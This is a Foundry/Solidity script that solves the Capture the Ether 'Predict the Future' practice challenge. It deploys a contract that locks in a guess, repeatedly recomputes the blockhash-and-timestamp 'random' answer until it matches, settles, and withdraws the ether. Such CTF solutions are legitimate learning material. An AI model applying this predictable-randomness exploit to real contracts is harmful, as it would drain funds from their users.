// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface CaptureTheEther {
    function completeChallenge(uint256 index) external;
}

interface PredictTheFuture {
    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureContract {
    address immutable owner;
    uint8 immutable n;
    PredictTheFuture immutable gameContract;

    constructor(PredictTheFuture _gameContract) payable {
        owner = msg.sender;
        n = 0;
        gameContract = _gameContract;
        _gameContract.lockInGuess{value: 1 ether}(0);
    }

    function tryGuess() external {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        if (answer == 0) {
            gameContract.settle();
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract PredictTheFutureScript is Script {
    address public constant GAME = 0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee;
    address public constant CONTRACT =
        0xcE661B100D00195968aC750B574F6A991969db9F;

    address public constant CHEATER =
        0x6cC115D23722331c4f0e46A80eA4d78E900D70fC;

    // Run the script with --slow to run only one transaction per block
    // Also need to manually adjust --gas-estimate-multiplier=250 as the tx simulation is likely to be done without settle()
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.broadcast(deployerPrivateKey);
        PredictTheFutureContract cheater = new PredictTheFutureContract{
            value: 1 ether
        }(PredictTheFuture(CONTRACT));

        // wait 2 blocks
        vm.broadcast(deployerPrivateKey);
        msg.sender.call("");
        vm.broadcast(deployerPrivateKey);
        msg.sender.call("");

        // PredictTheFutureContract cheater = PredictTheFutureContract(
        //     payable(CHEATER)
        // );

        uint256 i;
        while (address(cheater).balance == 0 && i < 40) {
            vm.broadcast(deployerPrivateKey);
            cheater.tryGuess();
            i++;
        }

        vm.broadcast(deployerPrivateKey);
        cheater.withdraw();

        vm.broadcast(deployerPrivateKey);
        CaptureTheEther(GAME).completeChallenge(7);
    }
}
